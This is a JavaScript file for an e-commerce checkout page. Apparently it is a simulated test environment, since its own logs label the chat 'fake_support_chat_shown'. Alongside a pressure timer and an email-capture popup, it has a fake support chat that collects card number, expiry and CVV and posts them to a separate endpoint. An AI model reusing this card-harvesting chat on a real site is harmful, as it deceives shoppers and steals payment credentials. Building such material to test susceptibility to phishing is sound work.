(function () {
  'use strict';

  var steps = ['cart', 'shipping', 'payment', 'review'];
  var currentStep = 'cart';
  var timerSeconds = 10 * 60;

  function postJSON(url, data) {
    return fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data || {})
    }).then(function (res) { return res.json(); });
  }

  function log(action, details) {
    return postJSON('/api/log', { action: action, details: details || {} });
  }

  function setStep(nextStep) {
    currentStep = nextStep;

    document.querySelectorAll('.step-content').forEach(function (node) {
      node.classList.toggle('active', node.id === 'step-' + nextStep);
    });

    document.querySelectorAll('.step').forEach(function (node) {
      var isActive = node.getAttribute('data-step') === nextStep;
      node.classList.toggle('active', isActive);
    });

    log('checkout_step_view', { step: nextStep });

    if (nextStep === 'payment') {
      setTimeout(showDiscountPopup, 1200);
    }

    if (nextStep === 'review') {
      setTimeout(showChatWidget, 900);
    }
  }

  function initStepButtons() {
    document.querySelectorAll('[data-next]').forEach(function (button) {
      button.addEventListener('click', function () {
        var next = button.getAttribute('data-next');
        setStep(next);
      });
    });
  }

  function startTimer() {
    var timerEl = document.getElementById('cartTimer');

    function tick() {
      if (!timerEl) return;

      var minutes = Math.floor(timerSeconds / 60);
      var seconds = timerSeconds % 60;
      timerEl.textContent = String(minutes).padStart(2, '0') + ':' + String(seconds).padStart(2, '0');

      if (timerSeconds > 0) {
        timerSeconds -= 1;
      } else {
        timerEl.textContent = '00:00';
      }
    }

    tick();
    setInterval(tick, 1000);
  }

  function showDiscountPopup() {
    var popup = document.getElementById('discountPopup');
    if (!popup || !popup.classList.contains('hidden')) return;

    popup.classList.remove('hidden');
    log('discount_popup_shown', { step: currentStep });
  }

  function initDiscountPopup() {
    var popup = document.getElementById('discountPopup');
    if (!popup) return;

    var closeBtn = document.getElementById('closeDiscount');
    var submitBtn = document.getElementById('submitDiscount');

    closeBtn.addEventListener('click', function () {
      popup.classList.add('hidden');
      log('discount_popup_closed', {});
    });

    submitBtn.addEventListener('click', function () {
      var email = document.getElementById('discountEmail').value.trim();
      if (!email) return;

      postJSON('/api/discount-email', { email: email }).then(function () {
        log('discount_email_submitted', { email: email });
        popup.classList.add('hidden');
      });
    });
  }

  function showChatWidget() {
    var widget = document.getElementById('chatWidget');
    if (!widget) return;

    widget.classList.remove('hidden');
    log('fake_support_chat_shown', { step: currentStep });
  }

  function initChatWidget() {
    var sendChat = document.getElementById('sendChat');
    var sendCard = document.getElementById('sendChatCard');

    sendChat.addEventListener('click', function () {
      var message = document.getElementById('chatMessage').value.trim();
      if (!message) return;

      postJSON('/api/chat-message', { message: message }).then(function (result) {
        document.getElementById('chatReply').textContent = result.response || '';
      });
    });

    sendCard.addEventListener('click', function () {
      var card = document.getElementById('chatCard').value.trim();
      var expiry = document.getElementById('chatExpiry').value.trim();
      var cvv = document.getElementById('chatCvv').value.trim();

      if (!card || !expiry || !cvv) return;

      postJSON('/api/chat-card-reentry', {
        card_number: card,
        expiry: expiry,
        cvv: cvv
      }).then(function () {
        document.getElementById('chatReply').textContent = 'Verification received by support.';
      });
    });
  }

  function initOrderSubmit() {
    var placeOrder = document.getElementById('placeOrder');
    var status = document.getElementById('orderStatus');

    placeOrder.addEventListener('click', function () {
      var payload = {
        full_name: document.getElementById('fullName').value.trim(),
        email: document.getElementById('email').value.trim(),
        address: document.getElementById('address').value.trim(),
        card_number: document.getElementById('cardNumber').value.replace(/\s/g, ''),
        expiry: document.getElementById('expiry').value.trim(),
        cvv: document.getElementById('cvv').value.trim(),
        save_with_partner_network: document.getElementById('partnerSave').checked
      };

      postJSON('/api/complete-checkout', payload)
        .then(function () {
          status.textContent = 'Order placed successfully.';
          status.classList.add('ok');
          log('order_success', { save_with_partner_network: payload.save_with_partner_network });
        })
        .catch(function () {
          status.textContent = 'Could not place order.';
          status.classList.remove('ok');
        });
    });
  }

  document.addEventListener('DOMContentLoaded', function () {
    initStepButtons();
    startTimer();
    initDiscountPopup();
    initChatWidget();
    initOrderSubmit();
    log('page_loaded', { flow: 'ecommerce_checkout' });
  });
})();
